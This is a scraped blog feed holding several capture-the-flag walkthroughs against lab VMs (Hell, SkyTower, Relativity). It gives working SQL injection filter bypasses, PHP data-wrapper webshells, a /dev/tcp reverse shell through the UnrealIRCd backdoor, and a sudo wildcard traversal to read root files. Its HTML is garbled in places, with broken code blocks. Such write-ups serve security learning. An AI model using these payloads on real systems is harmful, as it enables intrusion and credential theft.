After taking a break, I realized that the output that looks like that of</code>/usr/bin/id<code>, probably **is** that if it. So, off I went and did another</code>sha256sum<code>, type script, this time just with another reverse shell to port 4445, and naming it</code>id` so that part2 will pick it up:</p>

<p>```bash bazza Part2 reverse shell
→ nc -l 4445
$ /usr/bin/id
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)</p>

<p>$ cd /home/oj
$ ls -lh
total 584K
-r-sr-xr-x 1 root root 579K Jul  5 21:12 echo
-rw-r&mdash;r&mdash; 1 root root  154 Jul  5 21:06 How to be an infosec rockstar 101.txt
$
```</p>

<p>And there we are! Group membership for <code>oj</code>, and access to <code>/home/oj</code></p>

<h2>becoming root</h2>

<p>As with all of the other users, I added myself a ssh key for easy access.</p>

<p>Now, sadly I have to admit that this is as far as I have been able to come. <code>oj</code> has a binary called <code>echo</code> (not to be confused with the builtin echo), that, as expected, will echo what you input.</p>

<p><code>bash oj's echo
oj@hell:~$ ./echo onetwothree
onetwothree
oj@hell:~$
</code></p>

<p>I toyed with the inputs and noticed that when I entered inputs prefixed with a %, some strange stuff started to happen. Google helped me towards learning that this is what is called a <a href="https://www.owasp.org/index.php/Format_string_attack">Format String Attack</a></p>

<p><code>bash Format String Thing
oj@hell:~$ ./echo %08x.%08x.%08x
080488c0.bffffcf8.00000000
oj@hell:~$
</code></p>

<p>I am however satisfied that I have come this far, and will definitely endeavor to nail this format string vuln sometime. But that time is not now.</p>

<h2>summary</h2>

<p>Hell sure as heck taught me a lot and was one fun experience! Shoutout to <a href="https://twitter.com/@0x42424242">@0x42424242</a> for the time taken to make this VM available.</p>

    <id>http://leonjza.github.io/blog/2014/07/17/climbing-the-skytower</id>
    <content type="html"><![CDATA[<h2>foreword</h2>

<p>Recently, at a local Security Conference, <a href="https://twitter.com/telspacesystems">@telspacesystems</a> ran a CTF. It was a classic &lsquo;read /root/flag.txt&rsquo; CTF hosted on a wireless network. Sadly the wifi sucked, a lot, and due to this and a flat battery I was not able to attempt this CTF properly at the con. Nonetheless, the VM was released on <a href="http://vulnhub.com/entry/skytower-1,96/">VulnHub</a>, and was promptly downloaded and loaded into VirtualBox.</p>

<p>In summary, this CTF taught me some interesting things about SQL injection where filters are present. More specifically, commas were filtered out and resulted in the need from some creative thinking :)</p>

<h2>starting off</h2>

<p>The very first thing to do was get the IP assigned by my home router to the VM. Loaded this up into a web browser and saw the skytower web page as per the screenshots in the vulnhub entry. The IP I got was 192.168.137.242.</p>

<p>The home page presented you with a login screen and a 2.5MB &lsquo;background.jpg&rsquo; image. Right in the beginning I was started off on the wrong path. I downloaded this background image and attempted to see if there was anything particularly interesting about it. Sadly, the answer to this question was a loud <em>NOPE</em>. I started dirbuster on the web interface and proceeded with a nmap scan of 192.168.137.242 after which I had to call it a night.</p>

<p>```bash SkyTower Nmap results
$ nmap &mdash;reason -Pn 192.168.137.242</p>

<p>Starting Nmap 6.46 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2014-07-17 18:32 SAST
Nmap scan report for 192.168.137.242
Host is up, received user-set (0.0020s latency).
Not shown: 997 closed ports
Reason: 997 conn-refused
PORT     STATE    SERVICE    REASON

80/tcp   open     http       syn-ack
3128/tcp open     squid-http syn-ack
```</p>

<p>Next morning I reviewed the results and continued to poke around.</p>

<h2>learn all you can</h2>

<p>With the information gathered so far, I realized that the SSH (tcp/22) was explicitly filtered, however the squid proxy was open. I tried to telnet and use the CONNECT method to see if I was able to access the SSH service:</p>

<p>```bash SSH Access via open proxy
$ telnet 192.168.137.242 3128
Trying 192.168.137.242&hellip;
Connected to 192.168.137.242.
Escape character is &lsquo;^]&rsquo;.
CONNECT 127.0.0.1:22
HTTP/1.0 200 Connection established</p>

<p>SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u1
^]
telnet> quit
Connection closed.
```</p>

<p>Great, soooo I can get access to the SSH service of needed. The dirbuster results showed nothing of particular interest, but it was worth a shot anyways. An important thing to note here is that I suspect I maxed out the disk space in the VM due to the access_log growing too big from the dirbust. This caused me numerous headaches and frustrated me quite a bit when I was testing. Anyways&hellip;</p>

<p>The next step was to poke around the web application. I personally really enjoy web hacking so this was probably the most fun of the whole CTF. The web page presented you with a simple form that would POST to <code>login.php</code>. 2 fields were posted: <code>email</code> &amp; <code>password</code></p>

<p>A natural reaction is to try and use a single quote in form fields as a quick and nasty check for potential SQL injection. A login attempt with a username of test and password <code>'</code> resulted in:</p>

<p><code>bash SQLi Reveal
There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1]
</code></p>

<p>Classic SQLi! Surprised I continued with simple login bypasses. None that I could think of out of my head appeared to work. Eventually I started to notice that some of the keywords that I was using were not appearing in the error messages. This hinted heavily towards the fact that there may be some form of filtering in place. Eventually, I put the request down in a curl command so that I can work with this slightly easier. To sample the keywords being removed:</p>

<p>`&ldquo;bash SkyTower keyword removal
$ curl &mdash;data &ldquo;email=foo@bar&amp;password=&lsquo; OR 1=1#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>
There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '11#&rdquo; at line 1]%</p>

<p>$ curl &mdash;data &ldquo;email=foo@bar&amp;password=&lsquo;1 OR 1=1#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>
There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1  11#&rsquo;&lsquo; at line 1]%
```</p>

<p>Ok, so no <code>OR</code>. Thats ok, we can substitute this easily with <code>||</code>.</p>

<p>```html SkyTower Auth Bypass

```</p>

<p>And success. We have made some progress :D Little did I know that I don&rsquo;t actually completely understand the progress made yet, but just keep this in mind :)</p>

<h2>climbing the tower and faling hard</h2>

<p>From the auth bypass results, we can see specific mention for users to SSH into the server. This particular user has a username <code>john</code> and a password <code>hereisjohn</code>. So lets try this.
I setup my <code>proxychains</code> install to use the http proxy available on the server (<code>http 192.168.137.242 3128</code>) and opened a SSH session through it:</p>

<p>```bash SSH via Squid Proxy
$ proxychains4 ssh <a href="&#x6d;&#97;&#105;&#108;&#x74;&#111;&#x3a;&#x6a;&#111;&#x68;&#110;&#64;&#x31;&#50;&#55;&#46;&#x30;&#x2e;&#x30;&#x2e;&#49;">&#106;&#x6f;&#104;&#110;&#x40;&#49;&#50;&#x37;&#x2e;&#x30;&#46;&#x30;&#x2e;&#49;</a>

<p>Funds have been withdrawn
Connection to 127.0.0.1 closed.
$
```</p>

<p>&hellip; ok. So we get a session, and are told <em>Funds have been withdrawn</em>, and get the connection closed. Not exactly what I hoped for. Thinking what could cause this behavior, my mind went on to things like a custom shell, <code>.bashrc</code> files (assuming the user has bash a a shell) etc. So, I figured there may be more users on the system and I should try get those credentials too. After all, we have a working SQL injection point.</p>

<h2>more sql injection</h2>

<p>So back to the SQLi point it was. Taking a wild guess, I assumed there is a <code>users</code> table, and the table will have a primary key of <code>id</code>. So, <code>john</code> may have id 1, and a next user have id 2. So I modified the query slightly:</p>

<p><code>bash SkyTower = filter
$ curl --data "email=foo@bar&amp;password=' || id=1#" http://192.168.137.242/login.php
There was an error running the query [Unknown column 'id1' in 'where clause']%
</code></p>

<p>Well I definitely didn&rsquo;t ask for the column <code>id1</code>, but from this again it was apparent that <code>=</code> was filtered along with <code>OR</code>. :| Ok, so we change the payload again:</p>

<p>```bash SkyTower user enum
$ curl &mdash;data &ldquo;email=foo@bar&amp;password=&lsquo; || id > 1#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>
[snip]</p>

<br><strong><font size=4>Welcome sara@skytech.com</font><br /> </br></strong>As you may know, SkyTech has ceased all international operations.<br><br> To all our long term employees, we wish to convey our thanks for your dedication and hard work.<br><br><strong>Unfortunately, all international contracts, including yours have been terminated.</strong><br><br> The remainder of your contract and retirement fund, <strong>$2</strong> ,has been payed out in full to a secure account.

<p>```</p>

<p>Yay, my guess on the <code>id</code> column was correct, and I now had a second users details. I continued to increment the <code>id</code>, and ended up with 3 accounts:</p>

<ul>
<li>john:hereisjohn</li>
<li>sara:ihatethisjob</li>
<li>william:senseable</li>
</ul>


<p>The users <code>john</code> &amp; <code>sara</code> both had the same behavior when attempting login via SSH, and the user <code>william</code> appears to have had an incorrect password. So, again the results were not exactly what I hoped for.</p>

<h2>more SQL enumeration</h2>

<p>At this stage, I was thinking there must be more information in the database, and I should try and read some files from disk in order to gain a better understanding of what is going on here.</p>

<p>Fast forward a few hours, I discovered that a few more keywords and symbols were filtered. The hardest being the realization that a <code>union select</code> was not working as expected so that I can enumerate the columns. Even though the initial entry on vulnhub mentioned that automated tools would probably not work, I figured in this case that I had a valid SQLi, I could just make use of some SQLMap automagic. Again <em>NOPE</em>. Even with <code>--level 3</code> &amp; <code>--risk 3</code> there was no joy. This is ok.</p>

<p>I studied the error messages in detail, googled&hellip; a lot&hellip; and eventually came across <a href="http://zoczus.blogspot.nl/2013/03/sql-injection-without-comma-char.html">this</a> blogpost, detailing a way to get a union working without the ability to use commas. I should also note that I managed to bypass the <code>SELECT</code> filter by using <code>SELECSELECTT</code> in the payload. Assuming that the filter was a simple <code>str_replace()</code>, this left me with <code>SELECT</code> after the pass.</p>

<p>For the sake of brevity I am not going to detail all of the methods I used in order to exploit the SQLi and get value out of it. I managed to learn that the database user used by the PHP application was root. The query used in <code>login.php</code> returned 3 columns. One particular payload of interest that uses the method in the previously mentioned blog post, was used to start reading files from the servers disk. More specifically, <code>/etc/passwd</code>:</p>

<p>```bash SkyTower File Access
$ curl &mdash;data &ldquo;email=foo@bar&amp;password=&lsquo; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt load_file(&rsquo;/etc/password')) as c#&rdquo; <a href="http://192.168.137.242/login.php">http://192.168.137.242/login.php</a>

```</p>

<p>Reading the <code>/etc/passwd</code> revealed that there were no custom shells used for the users that were enumerated previously. O..k.. I also pulled the sources of <code>login.php</code> in order to understand what the deal with the filtering was:</p>

<p><code>php SkyTower SQL Injection Filtering
$sqlinjection = array("SELECT", "TRUE", "FALSE", "--","OR", "=", ",", "AND", "NOT");
$email = str_ireplace($sqlinjection, "", $_POST['email']);
$password = str_ireplace($sqlinjection, "", $_POST['password']);
</code></p>

<p>And as suspected. :)</p>

<p>One last thing that I tried, really hard, was to get a web shell on the server so that I can further explore the environment. This failed miserably. The closest I was able to get was:</p>

<p><code>bash SkyTower webshell fail
$ curl --data "email=foo@bar&amp;password=' or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt '&lt;?php print_r(shell_exec($_GET[cmd])); ?&gt;') as c into outfile '/var/www/shell.php'#" http://192.168.137.242/login.php
There was an error running the query [Can't create/write to file '/var/www/shell.php' (Errcode: 13)]
</code></p>

<p>This obviously alludes to the fact that the user MySQL is running as des not have access to write to the web folder. It was time to rethink what was going on here&hellip;
Oh yes, I obviously tried to just cat <code>/root/flag.txt</code>, but didn’t expect it to be <em>that</em> easy :D</p>

<h2>gaining further access</h2>

<p>After spending a really long time with the SQL injections, I decided to relook the SSH section. From the SQL injection that I learnt that there don&rsquo;t <em>appear</em> to be any custom shells in use, so the other thing this could be is a <code>.bashrc</code> with a <code>exit</code> command. I know its <code>.bashrc</code> because I saw the shell is <code>/bin/bash</code> from the <code>/etc/passwd</code>. I remember that I make heavy use of <code>ssh -t</code> to execute commands on the remove server, usually to setup multiple tunnels into a network, so I thought it will come in handy here.</p>

<p>For this case though, I though I&rsquo;d specify a <code>/bin/sh</code> as the <em>command</em> to run, hoping to not get caught in a <code>.bashrc</code> running:</p>

<p><code>bash SkyTower .bashrc fix
$ proxychains4 -q ssh john@127.0.0.1 -t /bin/sh
john@127.0.0.1's password:
$ id
uid=1000(john) gid=1000(john) groups=1000(john)
</code></p>

<p>Woop! I was now logged in as <code>john</code>. I inspected the <code>.bashrc</code> file and saw that at the end there was:</p>

<p><code>bash SkyTower .bashrc exit
echo
echo  "Funds have been withdrawn"
exit
</code></p>

<p>&hellip; a exit. I simply removed the line. Now the almost obvious next step was to inspect and enumerate as much as possible. The most obvious thing that came to mind was privilege escalation as I was simply a normal user on the system at the moment.</p>

<h2>enumeration enumeration enumeration</h2>

<p>I enumerated, everything&hellip; Referring to a excellent <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">post by g0tm1lk</a> nothing aparent came up. The only semi strange thing was a empty <code>/accounts/</code> directory:</p>

<p><code>bash SkyTower accounts
john@SkyTower:/accounts$ ls -lah /accounts/
total 8.0K
drwxr-xr-x  2 root root 4.0K Jun 20 07:52 .
drwxr-xr-x 24 root root 4.0K Jun 20 07:52 ..
</code></p>

<p>Other than that things seemed pretty normal. I decided to check out the other user <code>sara</code> too. This user has a similar <code>exit</code> in the <code>.bashrc</code> which I just removed. There was one distinct difference during enumeration though&hellip;</p>

<p>```bash sara sudo
sara@SkyTower:~$ sudo -l
Matching Defaults entries for sara on this host:</p>

<pre><code>env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</code></pre>

<p>User sara may run the following commands on this host:</p>

<pre><code>(root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
</code></pre>

<p>```</p>

<p>This user may execute some commands as root using <code>sudo</code>. <code>sudo</code> allows you to specify what those commands are, if not all. There was one problem with this configuration though. <code>*</code> is a wildcard character, and as such, anything after <code>cat /accounts/</code> may also be run. This means that things like <code>sudo cat /accounts/../../etc/shadow</code> will work as the wildcard allows us to do a form of directory traversal.</p>

<h2>pwnd</h2>

<p>So, to complete SkyTower:</p>

<p><code>bash SkyTower pwn
sara@SkyTower:~$ sudo cat /accounts/../../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
</code></p>

<p>Thanks to <a href="https://twitter.com/telspacesystems">@telspacesystems</a> for the fun experience. I learnt something so for this was totally worth it!</p>

    <id>http://leonjza.github.io/blog/2013/11/18/slash-root-slash-flag-dot-txt-solving-the-relativity-vulnerable-vm</id>
    <content type="html"><![CDATA[<h2>foreword</h2>

<p>At the time of writing this post, this VM was part of a local security communities (<a href="http://zacon.org.za/">zacon</a>) pre-con challenge. Finding /root/flag.txt would have entered you into a draw for winning a prize :D However, the greater goal of the challenge was to learn something. I set out some time and attempted the challenge. Fortunately, I managed to complete it in time. So, this is the journey I took to solve this. You can now download and try this VM yourself over at <a href="http://vulnhub.com/entry/devrandom_relativity,55/">VulnHub</a>. Unzip, mount and boot the VM. Once the VM is booted, it should have an IP assigned via DHCP.</p>

<p>I think it is interesting to note that I used a very limited set of tools to complete this. No bruteforcers, metasploits, vulnerability scanners and or fancy proxies were used. My toolset consisted out of netcat, nmap and other basic bash commands. There are probably a gazillion ways to do this as lots of this stuff is preference based on how they are approached. However, the basic ideas of the vulnerabilities remain the same.</p>

<h3>the challenge</h3>

<p>It all started with an announcement on the Zacon mailing list. A friendly heads-up about the challenge and some details were made available. We were given a hostname of where the challenge lived with clear instructions to find <code>flag.txt</code>. Sounds simple. I slapped the hostname as a url in a browser and was met with a image of M.C. Eshter&rsquo;s &lsquo;Relativity&rsquo;. Great. Something to start thinking about. I also nmapped the box. I mean, how else would you start, right? :)</p>

<p><code>bash 192.168.56.21 Nmap
Nmap scan report for 192.168.56.21 (192.168.56.21)
Host is up (0.0024s latency).
Not shown: 997 filtered ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
</code></p>

<p>Alright. This gives you a good idea of whats happening on the host, as well as some points to start off with.</p>

<h3>initial enumeration</h3>

<p>Enumeration is key to starting something like this. The more you know about the host, the more you are able to adapt and think about as you go through the challenge. So, we know we have a SSH Server, a FTP server and a Web server exposed.</p>

<p>Starting with the SSH server, I tried to check if password based authentication was on. Maybe Mr MC Eshter had an account on this box? You never know :)</p>

<p>``` bash SSH Login</p>

<h1>ssh <a href="&#109;&#97;&#105;&#108;&#116;&#111;&#58;&#x65;&#x73;&#x68;&#x74;&#101;&#x72;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#x2e;&#x35;&#54;&#46;&#50;&#49;">&#101;&#115;&#x68;&#116;&#101;&#x72;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#x38;&#x2e;&#53;&#x36;&#46;&#50;&#49;</a></h1>

<p>Permission denied (publickey).
```</p>

<p>So, we now know only key based authentication works. Thats fine. Next up was the FTP service.</p>

<p>```bash FTP Login</p>

<h1>ftp 192.168.56.21</h1>

ftp>
```</p>

<p>No anonymous FTP logins either. It appears that the Server&rsquo;s FTP banner has been customised and is maybe using the mod_sql plugin. A quick Google for mod_sql revealed that this may be ProFTPD with the mod_sql plugin. Great. This is an important piece of information. To complete the enumeration I moved on to the web server. It was time to inspect some request responses.</p>

<p>```bash Apache tokens.</p>

<h4>putting the enumeration together</h4>

<p>With the little bit of poking around we have just done, we are able to say that this may be a Fedora Core Server, running Apache 2.2.13, with ProFTPD and the mod_sql plugin. This already gives us quite a lot to work with in the sense of researching the respective software in search of known vulnerabilities.</p>

<p>With me loving web based security, my first attempt at further enumerating the machine was via the web server. I searched for <code>cgi-bin/</code> type problems, potentially hidden directories via <code>robots.txt</code>, username enumeration via home directories etc. to no avail. At some stage it became very apparent that the initial entry point for this server was not via the Web.</p>

<h3>the initial attack</h3>

<p>The next step was the FTP server. As it was purposely disclosing the fact that it was using mod_sql, instinct kicked in and I attempted to check the responses if I tried to login with username <strong>&lsquo;</strong> and password <strong>&rsquo;</strong>.</p>

<p>```bash mod_sql SQLi attempt</p>

<h1>ftp 192.168.56.21</h1>

<p>Connected to 192.168.56.21.
220 Welcome to Relativity FTP (mod_sql)
Name (192.168.56.21:root): &lsquo;
331 Password required for &rsquo;.
Password:
421 Service not available, remote server has closed connection
Login failed.
No control connection for command: Success
ftp>
```</p>

<p>As you can clearly see, the response does differ from when I initially attempted to login as anonymous. This highly suggests that one of the fields is SQL injectable. And so, it was research time. Using good &lsquo;ol trusty Google, I searched for <em>proftpd mod_sql injection vulnerability</em>. Hey presto! The very first hit describes a vulnerability <a href="http://www.securityfocus.com/bid/33722">disclosed</a> in 2009.</p>

<p>From this research, we can be pretty confident in thinking that this specific FTP server may as well be vulnerable to the exact same vulnerability, and may very well be our first entry point into the system. Sample exploits are available <a href="http://www.securityfocus.com/bid/33722/exploit">here</a>, and as such I attempted to exploit this. I copied the SQLi payload from the website <code>%') and 1=2 union select 1,1,uid,gid,homedir,shell from users; --</code> and pasted this as the username, whereafter I provided 1 as the password.</p>

<p>```bash mod_sql SQLi attempt 2</p>

<h1>ftp 192.168.56.21</h1>

<p>Connected to 192.168.56.21.
220 Welcome to Relativity FTP (mod_sql)

331 Password required for %&rsquo;).
Password:
421 Service not available, remote server has closed connection
Login failed.
No control connection for command: Success
ftp> bye
```</p>

<p>No dice. :| Ok, well I guess I couldn&rsquo;t have expected it to be <em>that</em> easy. This caused me to dig even deeper and research exactly what the problem is, and why this vulnerability exists. Eventually, I got hold of a vulnerable version of the software, set it up in a LAB VM, and tested the SQLi payload until it worked. I ended up with a slightly different payload to the ones available online.</p>

<p>```bash mod_sql SQLi success</p>

<h1>ftp 192.168.56.21</h1>

<p>Connected to 192.168.56.21.
220 Welcome to Relativity FTP (mod_sql)

331 Password required for %&rsquo;).
Password:
230 User %&lsquo;) and 1=2 union select 1,1,uid,gid,homedir,shell from users;# logged in.
Remote system type is UNIX.

ftp>
```</p>

<p>w00t. Notice the difference though? The SQL commenting was changed from &mdash; to #. Apparently, MySQL is pretty finicky about the fact that the &mdash; style comments should have a space afterwards. This means that a payload ending with say, <code>from users; -- NOTHING_OF_VALUE</code> would have worked too. Just putting a space after the &mdash; did not work as the software most probably does a type of <code>trim()</code> on the field, hence the need to have something after the space too. Awesome, something learnt.</p>

<h3>web based attack</h3>

<p>Now that we have FTP access to the host, we simply needed to <code>ls</code> to learn what is the next step.</p>

<p><code>bash FTP Web Directory Reveal</code>
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-xr-x   3 root     root         4096 Mar  5  2013 0f756638e0737f4a0de1c53bf8937a08

550 0f756638e0737f4a0de1c53bf8937a08: Permission denied
ftp>
```</p>

<p>A directory called &lsquo;0f756638e0737f4a0de1c53bf8937a08&rsquo; was present, however our FTP user does not have access to this. We are able to deduce that this is in the web folder based on the content of the directory we have access to. So, time to slap <a href="http://192.16.56.21/0f756638e0737f4a0de1c53bf8937a08">http://192.16.56.21/0f756638e0737f4a0de1c53bf8937a08</a> into a web browser.</p>

<h3>exploiting the web based vulnerability</h3>

<p>Browsing to the above mentioned URL revealed a PHP driven website filled with information about the Relativity artwork. While this in itself was interesting, the real interest was in the url&rsquo;s to different parts of the website. More specifically, the urls were composed as <code>index.php?page=definition.php</code>. Immediately this suggested that the file <code>index.php</code> was programmed to include other files in order to render the content. In the examples case it included definition.php.</p>

<p>My first attempts to exploit this was very successful. For this kind of potential vulnerability, I have a small PHP <a href="http://php.net/manual/en/wrappers.data.php">data stream wrapper</a> shell in my toolbox. Normally, the shell looks something like this:</p>

<p><code>php PHP Data stream Wrapper Shell
?file=data:,&lt;?php system($_GET[c]); ?&gt;&amp;c=ls
</code></p>

<p>Sometimes however, sites tend to attempt to filter out certain PHP commands. So, in order to increase the chances of success, a base64 encoded version ends up being my favourite:</p>

<p><code>php Base 64 Encoded Data stream Wrapper Shell
?file=data:;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=&amp;c=dir
</code></p>

<p>I used this and now had shell access to the box. Remembering the basic tips of enumerate->exploit->post-exploit, I ran a few simple commands, just to get a better feel for the environment that I was facing. I was using Google Chrome. If you add &lsquo;view-source:&rsquo; to the front of a url, or right click-> view source, then you will see the output for your command shell in a much neater and easier to read layout. I ran the commands <code>id; uname -a; sestatus; pwd; ls -lah /home; cat /etc/passwd</code>:</p>

<p><img class="<a" src="href="http://i.imgur.com/pnBHjXv.png">http://i.imgur.com/pnBHjXv.png</a>"></p>

<p>From this we know that the server is running Fedora Core 17, with the 3.9.8-100 kernel. SELinux is disabled. There are 2 users with /home directories, of which <code>jetta</code>&rsquo;s directory is protected from me reading it at the moment. root, mauk and jetta all have valid logins shells too.</p>

<p>Taking one quick step back, I investigated the sources of the website in order to maybe find some credentials that may attach this website to a database or something similarly useful. While doing this, I noticed the index.php page was in fact doing partial input validation, which may cause some web shells not to work :)</p>

<p>```php Hidden site index validation
$blacklist_include=array(&ldquo;php://&rdquo;);
for ($i=0; $i&lt;count($blacklist_include); $i++){</p>

<pre><code>     if (strpos($_GET['page'],$blacklist_include[$i]) !== false){
            die();
    }
</code></pre>

<p>}
$page = $_GET[&lsquo;page&rsquo;];
include ($page);
```</p>

<h3>gaining further access</h3>

<p>From here you can of course take the time to set yourself up with a very nice interactive shell using this web based remote file inclusion vulnerability. However, browsing around the file system its clear that you can browse in the user <code>mauk</code>&rsquo;s home directory. While the directory itself has nothing of real value, there are still the hidden directories to view. Usually, these include things such as the users bash_history, bashrc etc. Also, ssh key related information would typically reside inside .ssh/. In this users .ssh/ directory, he left he’s SSH private key there, with permissions set so that anyone can read it. So, using the web based remote file include shell we are able to steal this off the server with the command <code>cat /home/mauk/.ssh/id_rsa</code>, which would echo us the key.</p>

<p><code>bash User mauk's private SSH key:

</code></p>

<p>What is particularly important to note here is the fact that this private key is not password protected. Usually, password protected keys would have a line such as <code>Proc-Type: 4,ENCRYPTED</code> indicating this. This key does not. So, using this, it would be as easy as specifying a private key to use when connecting and viola. I saved the the contents of <code>id_rsa</code> to a file called <code>key</code>, and specified it to be used when connecting with the <code>-i</code> flag:</p>

<p>w00t. Now, we have a proper interactive shell as the user <code>mauk</code>! :)</p>

<h3>enumerating the next step</h3>

<p>Again, enumerate->exploit->post-exploit are very important steps. Now we find ourselves at the post-exploitation part again. Learn as much as you can about everything you can. Having the interactive SSH session that we have now, it was a breeze to learn quite a lot about the server. More importantly, learning about that which we also don’t have access to.</p>

<p>Enumeration is not just about files and the access. It also includes network interfaces, configuration etc. In the user <code>mauk</code>&rsquo;s case, he had a .bash_history file, which revealed the key to the next part of the challenge. I also noticed port 6667 (irc) being open locally along with a ircd running as the user jetta.</p>

<p>```bash Mauks bash_history
[mauk@Relativity ~]$ cat .bash_history</p>

<p>ssh -f <a href="&#x6d;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#x72;&#111;&#111;&#116;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#x31;&#52;&#x34;&#46;&#x32;&#50;&#x38;">&#114;&#111;&#111;&#116;&#x40;&#49;&#57;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x31;&#x34;&#52;&#46;&#50;&#50;&#x38;</a> -R 6667:127.0.0.1:6667 -N
su &ndash;
exit
su &ndash;
[mauk@Relativity ~]$
```</p>

<p>The bash_history confirmed the use of the ircd, and as such, I re-setup my ssh connection to the server, this time forwarding port 6667 to my laptop so that I may connect to it with a local irc client. The ssh command now looked something like this: <code>ssh -L 6667:127.0.0.1:6667 mauk@192.168.56.21 -i key</code></p>

<h3>good &lsquo;ol irc</h3>

<p>With the now forwarded IRC port, my local client connected to the irc service, and the following MOTD was sent:</p>

<p>Toying around with the IRC service did not yeald much results. No useful channels or anything funny was found with the service. However, the actual server that was running was <a href="http://www.unrealircd.com/">UnrealIRCD</a> v 3.8.2.1 as can be seen in the servers MOTD. Again, using this amazing tool called Google, I checked whats up with this version of UnrealIRCD. Lo and behold the first hit &lsquo;UnrealIRCD 3.2.8.1 Backdoor Command Execution &ndash; Rapid7&rsquo;. Excellent. Seems like this version has a remote command execution backdoor. The hit on Google to Rapid7&rsquo;s actually links to a Metasploit module for this exact same backdoor.</p>

<p>It was time to research the vulnerability a bit, just to understand what exactly is going on here. A great resource was found <a href="http://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html">here</a>, where it was explained that a piece of code exists <code>#define DEBUG3_DOLOG_SYSTEM(x) system(x)</code>, that does a system command if it sees traffic prepended with <code>AB;</code>. Alright. I didn’t have metasploit immediately available, so I opted for the <code>nc</code> shell, just to test it out. To my disappointment, it seemed like I missed something very important here as I received no output when issuing commands.</p>

<p>So back to the drawing board it was. I decided to download and compile my own local version of the backdoored ircd daemon, and test what the expected result of this backdoor should be. At the same time I also learnt a little about unrealircd itself and how to configure it. win :)</p>

<p>Eventually I got the daemon running and was able to test the backdoor locally. Still, no command output was received when commands were issued, however, I did notice that the commands themselves actually <strong>do</strong> execute. I echoed &lsquo;a&rsquo; to a file in /tmp/ via the backdoor, and in a SSH session confirmed that it now existed.</p>

<p>So, back on the challenge vm, I have port 6667 still forwarded locally. To test this, I ran a command to list the contents of /home/ and redirect the output to a file in /tmp.</p>

<p>```bash Testing UnrealIRCD backdoor</p>

<h1>echo &ldquo;AB; ls -lah /home/ > /tmp/1&rdquo; | nc 127.0.0.1 6667</h1>

<p>:relativity.localdomain NOTICE AUTH :<strong><em> Looking up your hostname&hellip;
:relativity.localdomain NOTICE AUTH :</em></strong> Couldn&rsquo;t resolve your hostname; using your IP address instead
:relativity.localdomain 451 AB; :You have not registered
^C
```</p>

<p>Back on the SSH session I had with <code>mauk</code>&rsquo;s account, /tmp/1 appeared, however without permissions for me to see it. So, I reran the previous command, substituting the backdoor command to <code>chmod 777 /tmp/1</code>. I reran the cat on /tmp/1 in mauk&rsquo;s session and bam:</p>

<p><code>bash UnrealIRCD backdoor testing
mauk@Relativity ~]$ cat /tmp/1
total 16K
drwxr-xr-x.  4 root  root  4.0K Feb 25  2013 .
dr-xr-xr-x. 18 root  root  4.0K Feb 28  2013 ..
drwx------.  4 jetta jetta 4.0K Sep 28 10:03 jetta
drwxr-xr-x.  3 mauk  mauk  4.0K Jul  9 08:55 mauk
</code></p>

<p>Oh yes! Its working! In a broken kind of way, but it works! To make my life a little easier, I changed the backdoor command to actually give me a back connect bash shell so that I can have a interactive session. Its a time saving thing really. My command to the IRCd was now <code>echo "AB; bash -i &gt;&amp; /dev/tcp/&lt;my machine&gt;/6676 0&gt;&amp;1" | nc 127.0.0.1 6667</code>. On my machine I opened a netcat listener on port 6676 and waited for the session to spawn:</p>

<p>```bash Back connect shell for jetta</p>

<h1>nc -vnlp 6676</h1>

<p>listening on [any] 6676 &hellip;
connect to [<snip>] from (UNKNOWN) [192.168.56.21] 53493
bash: no job control in this shell
[jetta@Relativity Unreal]$
```</p>

<p>Great. Now it will be a lot easier to navigate around. Spawing the shell the way I did started me off in <code>/opt/Unreal</code>, which was a directory I previously did not have access to. I poked around here for a bit, trying to see if I missed anything with regards to the IRC setup. Nothing was immediately apparent, so, I moved on to the rest of the machine. More specifically, in <code>jetta</code>&rsquo;s home directory, there was a binary called <code>auth_server</code>, owned by root, but with no suid bit. I attempted to execute the binary, and was greeted by a spinning pipe, and eventually a &lsquo;error(12)&rsquo; after a classic cowsay.</p>

<p>```bash auth_server Test run
[jetta@Relativity ~]$ ls -lah auth_server/auth_server

<p>Right&hellip; well that is not exactly very helpful&hellip; or is it? Admittedly, this was the part that cost me the most time. I got lost on a path which is lead by enum->sploit->post, and wandered off into a world of binary analysis, process packet sniffing and eventually reverse engineering. Initially, I somehow figured that <code>auth_server</code> should be running, and <em>should</em> provide the IRCd with NickServ capabilities, so that <em>maybe</em> I could VHOST to a vDomain of a operator account, IDENT as him and then discover other hidden treasures&hellip;</p>

<p>Granted, I did do some basic enum, and figured after I ran <code>id</code> and saw that the account for <code>jetta</code> was not in any fancy groups, there was nothing more to see here.</p>

<p><strong>EVENTUALLY</strong>, after a number of tactical coffees and rethinking of what I have seen so far, I came back to re-attempt this.</p>

